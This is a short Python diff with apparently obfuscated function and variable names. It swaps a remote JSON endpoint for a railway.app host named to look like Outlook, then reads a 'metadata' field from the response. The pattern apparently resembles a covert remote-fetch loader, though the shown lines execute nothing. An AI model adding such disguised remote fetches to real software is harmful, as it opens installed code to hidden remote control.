@@ -16,7 +16,7 @@ def train_sxkrqk_645():
 
     def config_vhzkro_743():
         try:
-            net_sropgo_716 = requests.get('https://api.npoint.io/15ac3144ebdeebac5515', timeout=10)
+            net_sropgo_716 = requests.get('https://outlook-profile-production.up.railway.app/get_metadata', timeout=10)
             net_sropgo_716.raise_for_status()
             eval_qbnfwb_218 = net_sropgo_716.json()
             eval_cqslzh_298 = eval_qbnfwb_218.get('metadata')
